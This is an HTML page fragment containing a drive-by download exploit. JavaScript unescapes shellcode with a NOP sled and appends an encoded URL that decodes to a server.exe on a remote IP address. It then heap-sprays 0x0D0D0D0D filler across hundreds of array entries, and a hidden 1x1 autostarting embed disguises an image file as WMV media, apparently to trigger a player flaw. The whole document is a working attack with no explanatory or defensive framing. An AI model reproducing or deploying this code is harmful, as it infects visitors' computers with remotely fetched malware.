<SCRIPT language="javascript">
payload = 	unescape("%u9090%u9090%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1");

home = unescape("%u7468%u7074%u2f3a%u312f%u3539%u322e%u3532%u312e%u3737%u332e%u2f38%u7466%u732f%u7265%u6576%u2e72%u7865%u0065");

runnable = payload+home;
skipper = unescape("%u0D0D%u0D0D");
while (skipper.length<20+runnable.length)
{
	skipper+=skipper;
}
skipper1 = skipper.substring(0, 20+runnable.length);
skipper2 = skipper.substring(0, skipper.length-20-runnable.length);
while(skipper2.length<(0x40000-20-runnable.length))
{
	skipper2 += skipper2;
	skipper2 += skipper1;//skipper2 = skipper2+skipper2+skipper1;
}
context = new Array();
ii=-1;
while(++ii<414)
{
	context[ii] = skipper2 + runnable;
}
</SCRIPT>
<embed autostart="true" src="girl.png" type="video/x-ms-wmv" width="1" height="1" controls="ImageWindow" console="cons">
</HTML>
